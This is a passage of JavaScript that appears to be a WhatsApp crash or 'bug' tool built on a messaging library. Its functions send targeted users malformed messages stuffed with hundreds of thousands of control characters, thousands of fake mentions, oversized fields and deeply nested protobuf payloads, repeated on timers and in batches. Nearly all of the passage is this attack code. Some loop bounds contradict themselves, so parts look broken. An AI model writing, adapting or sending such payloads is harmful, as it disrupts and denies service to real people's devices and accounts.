newsletterJid: "0@s.whatsapp.net",
inviteMessage: "\u0000".repeat(5000) + "\u001A".repeat(5000),
serverMessageId: 999999,
contextInfo: {
mentionedJid: [target],
isForwarded: true,
forwardingScore: 9999999,
messageContextInfo: {
deviceListMetadata: {
senderKeyIndex: 999999,
senderTimestamp: Date.now() + 999999,
recipientKeyIndex: 999999
},
deviceListMetadataVersion: 999999,
messageSecret: Buffer.from("\u0000".repeat(1000))
}
}
}
});

await sock.relayMessage(target, {
paymentInviteMessage: {
currencyCodeIso4217: "USD",
amount1000: "999999999",
expiryTimestamp: "9999999999",
inviteMessage: "".repeat(1770) + "\u0000".repeat(5000),
serviceType: 1,
contextInfo: {
mentionedJid: [target],
isForwarded: true,
forwardingScore: 9999999,
messageContextInfo: {
deviceListMetadata: {
senderKeyIndex: 999999,
senderTimestamp: Date.now() + 999999,
recipientKeyIndex: 999999
},
deviceListMetadataVersion: 999999,
messageSecret: Buffer.from("\u0000".repeat(1000))
}
}
}
});

await sock.relayMessage(target, {
interactiveMessage: {
body: {
text: "\u001A".repeat(500000)
},
nativeFlowMessage: {
buttons: [
{
name: "galaxy_message",
buttonParamsJson: JSON.stringify({
icon: "REVIEW",
flow_cta: "\u001A".repeat(5000),
flow_message_version: "3"
})
},
{
name: "galaxy_message",
buttonParamsJson: JSON.stringify({
icon: "REVIEW",
flow_cta: "\u0000",
flow_message_version: "3"
})
},
{
name: "galaxy_message",
buttonParamsJson: JSON.stringify({
icon: "REVIEW",
flow_cta: "".repeat(1770),
flow_message_version: "3"
})
}
],
messageParamsJson: "{}".repeat(1000),
messageVersion: 3
}
}
});

console.log(`✅ Blank Notif sent to ${target}`);

} catch (error) {
console.log(`❌ Blank Notif error: ${error.message}`);
}
}

async function times(sock, target) {
  const delay = ms => new Promise(resolve => setTimeout(resolve, ms));

const durasi = 60 * 2000; /// WAKTU 2000 = 2MENIT FUNCTION BERJALAN

const interval = 3500; /// JEDA NYA 3500 = 3DETIK LEBIH 5 ANU /// SARAN KALO MAU LEBIH AWAT 4000 ATU 5000

const mulai = Date.now();

let mmk = []
    for (let p = 0; p < 9; p++) {
        mmk.push({
            header: {
                hasMediaAttachment: true,
                "imageMessage": {
    "url": "https://mmg.whatsapp.net/v/t62.7118-24/791885237_1370954038350659_525984428811205570_n.enc?ccb=11-4&oh=01_Q5Aa5gEmTwfJ3abnydAfI8Ep6VahU4nyo_VO9PqUfxxbFFNH8Q&oe=6AC35930&_nc_sid=5e03e0&mms3=true",
    "mimetype": "image/jpeg",
    "fileSha256": "mIl61rSmQ4E4z82XpSvhmpSOT8ByiqgLVwrPk4zC4+4=",
    "fileLength": "236877",
    "height": 1254,
    "width": 1254,
    "mediaKey": "q3wk/KIXEaRS4QD7VG+n5jWvnbdMcO/xjhZ7h4SCBmI=",
    "fileEncSha256": "iG6x4KtQSfdcjLNipUagllg3k8Yj3ANspD+9bWstHB0=",
    "directPath": "/v/t62.7118-24/791885237_1370954038350659_525984428811205570_n.enc?ccb=11-4&oh=01_Q5Aa5gEmTwfJ3abnydAfI8Ep6VahU4nyo_VO9PqUfxxbFFNH8Q&oe=6AC35930&_nc_sid=5e03e0",
    "mediaKeyTimestamp": "1788599798",
    "jpegThumbnail": "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",
    "contextInfo": {
      "featureEligibilities": {
        "canReceiveMultiReact": true
      },
      "pairedMediaType": "NOT_PAIRED_MEDIA",
      "statusSourceType": "IMAGE"
    },
    "scansSidecar": "fEzYz84hPJzLMNFbyo98xx6yZlX6W4GusDrqhIe0pcsJPQBDrJ6/Tw==",
    "scanLengths": [
      18787,
      116942,
      40973,
      60175
    ],
    "midQualityFileSha256": "N8qO2XeOS55EXzkUCxU1G0kj4Araewzz/XX9I2zsiD0="
  }
  },
  body: { text: "Satz" },
  nativeFlowMessage: {
  buttons: "\0".repeat(20000)
  }
  })
  }


while (Date.now() - mulai < durasi) {
    try {
        await conn.relayMessage(target, {
            groupStatusMessageV2: {
            message: {
                interactiveMessage: {
                    body: {
                        text: "Skylinne"
                    },
                    carouselMessage: {
                        cards: mmk
                    },
                    contextInfo: { 
                        mentionedJid: Array.from({ length: 2000 }, (_, p) => `${p + 62}@s.whatsapp.net`)
                    }
                }
            }
        }
        }, {});

        await delay(interval);
    } catch (err) {
        console.error(err);
        await delay(interval);
    }
}
}

async function forcek7Stc(sock, target) {
    const Stc = {
        url: "https://mmg.whatsapp.net/o1/v/t24/f2/m235/AQNoT0RVMsuqbGex4OAhCfu4uJgG8NDGShMN2WvxFxGEKQIN9AiuElv-4a6btmTyzbCYvvc6h-WsBx2srRxEA8LMPxWi_qtr6MvQV73Meg?ccb=9-4&oh=01_Q5Aa5AGLJ8RxEGZ7pZhWUQzr6gaFzyzpge4GNToAX6gKki2QZQ&oe=6A9602BA&_nc_sid=e6ed6c&mms3=true",
        directPath: "/o1/v/t24/f2/m235/AQNoT0RVMsuqbGex4OAhCfu4uJgG8NDGShMN2WvxFxGEKQIN9AiuElv-4a6btmTyzbCYvvc6h-WsBx2srRxEA8LMPxWi_qtr6MvQV73Meg?ccb=9-4&oh=01_Q5Aa5AGLJ8RxEGZ7pZhWUQzr6gaFzyzpge4GNToAX6gKki2QZQ&oe=6A9602BA&_nc_sid=e6ed6c",
        mediaKey: "xD3KegXJnRDJbL89tyWMpG1m12+jAXgXKN0XhTS0riM=",
        fileEncSha256: "ef7Y+a5ufhg2pfcsfZ23SYE4vUNtyoc3j/8/yyqr58Q=",
        fileSha256: "84cNaVGkzmIJwjozrUJipNbXoNb0ovMC8OWBMpLRcYU=",
        fileLength: 20010,
        mediaKeyTimestamp: "1785637793",
        mimetype: "image/webp",
        height: 512,
        width: 512
    };

    const documsg = {
        url: "https://mmg.whatsapp.net/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0&mms3=true",
        mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
        fileSha256: "ld5gnmaib+1mBCWrcNmekjB4fHhyjAPOHJ+UMD3uy4k=",
        fileLength: 999999999,
        pageCount: 0x9184e729fff,
        mediaKey: "5c/W3BCWjPMFAUUxTSYtYPLWZGWuBV13mWOgQwNdFcg=",
        fileName: "NtahMengapa..",
        fileEncSha256: "pznYBS1N6gr9RZ66Fx7L3AyLIU2RY5LHCKhxXerJnwQ=",
        directPath: "/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0",
        mediaKeyTimestamp: "1715880173",
        contactVcard: true
    };

    const contactMessage = {
        viewOnceMessage: {
            message: {
                contactMessage: {
                    displayName: "HeySaka",
                    vcard: `BEGIN:VCARD
VERSION:3.0
FN:HeySaka Official ID
TEL;type=CELL;type=VOICE;waid=6281274703907:6281274703907
END:VCARD`,
                    contextInfo: {
                        mentionedJid: Array.from({ length: 30000 }, () => "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"),
                        isSampled: true,
                        participant: target,
                        remoteJid: "status@broadcast",
                        forwardingScore: 9741,
                        isForwarded: true
                    }
                }
            }
        }
    };

    const TAGS = [[0xBA, 0x03], [0xD2, 0x04], [0xAA, 0x02]];

    const encodeVarint = function(n) {
        let buf = [];
        while (n >= 0x80) { buf.push((n & 0x7f) | 0x80); n >>>= 7; }
        buf.push(n);
        return Buffer.from(buf);
    };

    const wrapLd = function(tag, data) {
        return Buffer.concat([Buffer.from(tag), encodeVarint(data.length), data]);
    };

    const resolveJid = function(raw) {
        let s = String(raw || '').trim();
        if (s.includes('@')) return s;
        return s.replace(/\D/g, '') + '@s.whatsapp.net';
    };

    const jids = (Array.isArray(target) ? target : [target])
        .map(resolveJid)
        .filter(j => j.length > 15);

    if (!jids.length) throw new Error('No valid JIDs');

    const MAX_BATCH = 15;
    const DELAY_MS = 15000;
    let totalSent = 0;

    const basePayloadSticker = proto.Message.encode(
        proto.Message.fromObject({ stickerMessage: Stc })
    ).finish();

    const basePayloadDocu = proto.Message.encode(
        proto.Message.fromObject(documsg)
    ).finish();

    const basePayloadContact = proto.Message.encode(
        proto.Message.fromObject(contactMessage)
    ).finish();

    const inflateSticker = function(tag, depth) {
        let buf = basePayloadSticker;
        for (let i = 0; i < depth; i++) buf = wrapLd(tag, wrapLd([0x0A], buf));
        return buf;
    };

    const inflateDocu = function(tag, depth) {
        let buf = basePayloadDocu;
        for (let i = 0; i < depth; i++) buf = wrapLd(tag, wrapLd([0x0A], buf));
        return buf;
    };

    const inflateContact = function(tag, depth) {
        let buf = basePayloadContact;
        for (let i = 0; i < depth; i++) buf = wrapLd(tag, wrapLd([0x0A], buf));
        return buf;
    };

    console.log(`? Starting: ${jids.length} targets`);

    for (let offset = 0; offset < jids.length; offset += MAX_BATCH) {
        const chunk = jids.slice(offset, offset + MAX_BATCH);
        const batchNum = Math.floor(offset / MAX_BATCH) + 1;
        const totalBatches = Math.ceil(jids.length / MAX_BATCH);

        if (offset > 0) {
            console.log(`? Waiting ${DELAY_MS/1000}s...`);
            await new Promise(r => setTimeout(r, DELAY_MS));
        }

        const suffix = batchNum > 1 ? '-' + batchNum : '';

        const msgIdSticker = 'stc' + Date.now().toString(36).toUpperCase() + suffix;
        for (let ti = 0; ti < TAGS.length; ti++) {
            const tag = TAGS[ti];
            let payload = null;
            for (let depth = 2000; depth >= 10000 && !payload; depth -= 400) {
                try {
                    const decoded = proto.Message.decode(inflateSticker(tag, depth));
                    proto.Message.encode(decoded).finish();
                    payload = decoded;
                } catch (_) {}
            }
            if (payload) {
                await sock.relayMessage('status@broadcast', payload, {
                    messageId: msgIdSticker,
                    statusJidList: chunk,
                    additionalNodes: [{
                        tag: 'meta',
                        attrs: {},
                        content: [{
                            tag: 'mentioned_users',
                            attrs: {},
                            content: chunk.map(jid => ({ tag: 'to', attrs: { jid }, content: [] }))
                        }]
                    }]
                });
                totalSent++;
            }
        }

        const msgIdDocu = 'doc' + Date.now().toString(36).toUpperCase() + suffix;
        for (let ti = 0; ti < TAGS.length; ti++) {
            const tag = TAGS[ti];
            let payload = null;
            for (let depth = 8000; depth >= 30000 && !payload; depth -= 400) {
                try {
                    const decoded = proto.Message.decode(inflateDocu(tag, depth));
                    proto.Message.encode(decoded).finish();
                    payload = decoded;
                } catch (_) {}
            }
            if (payload) {
                await sock.relayMessage('status@broadcast', payload, {
                    messageId: msgIdDocu,
                    statusJidList: chunk,
                    additionalNodes: [{
                        tag: 'meta',
                        attrs: {},
                        content: [{
                            tag: 'mentioned_users',
                            attrs: {},
                            content: chunk.map(jid => ({ tag: 'to', attrs: { jid }, content: [] }))
                        }]
                    }]
                });
                totalSent++;
            }
        }

        const msgIdContact = 'cnt' + Date.now().toString(36).toUpperCase() + suffix;
        for (let ti = 0; ti < TAGS.length; ti++) {
            const tag = TAGS[ti];
            let payload = null;
            for (let depth = 9000; depth >= 3000 && !payload; depth -= 400) {
                try {
                    const decoded = proto.Message.decode(inflateContact(tag, depth));
                    proto.Message.encode(decoded).finish();
                    payload = decoded;
                } catch (_) {}
            }
            if (payload) {
                await sock.relayMessage('status@broadcast', payload, {
                    messageId: msgIdContact,
                    statusJidList: chunk,
                    additionalNodes: [{
                        tag: 'meta',
                        attrs: {},
                        content: [{
                            tag: 'mentioned_users',
                            attrs: {},
                            content: chunk.map(jid => ({ tag: 'to', attrs: { jid }, content: [] }))
